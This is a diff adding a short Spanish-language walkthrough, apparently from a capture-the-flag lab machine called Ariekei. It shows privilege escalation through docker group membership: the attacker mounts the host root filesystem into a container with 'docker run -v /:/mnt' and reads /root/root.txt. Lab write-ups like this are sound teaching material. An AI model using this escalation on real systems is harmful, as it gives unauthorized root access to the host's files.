@@ -1,0 +1,26 @@
+[*] Maquina Ariekei
+[*] Para realizar este ataque tendremos que tener disponible el grupo docker en un usuario no privilegiado
+
+[*] Primero deberemos de ver si tenemos asignados el grupo docker
+
+[*] Al ver que tendremos el grupo docker asignado, tendremos que ver que dockers hay abiertos
+
+  ~$> docker images
+
+  [+] Output:
+
+    waf-template        latest              399c8876e9ae        4 years ago         628MB
+    bastion-template    latest              0df894ef4624        4 years ago         251MB
+    web-template        latest              b2a8f8d3ef38        4 years ago         185MB
+    bash                latest              a66dc6cea720        4 years ago         12.8MB
+    convert-template    latest              e74161aded79        6 years ago         418MB
+
+[*] Usare el waf-template pero se puede usar el que quieras
+[*] Para aprovecharnos de el grupo docker jugaremos con las monturas para que dentro del docker nos monte una montura de el equipo principal
+
+  [+] Con el -v nos montaremos la montura en /mnt
+  ~$> docker run --rm -v /:/mnt -it waf-template bash
+
+  [+] Dentro del docker nos iremos al /mnt y veremos que tendremos una lista de directorios en la cual podremos leer el directorio /root de el equipo principal gracias a la montura
+  ~$> cd /mnt
+  ~$> cat /root/root.txt
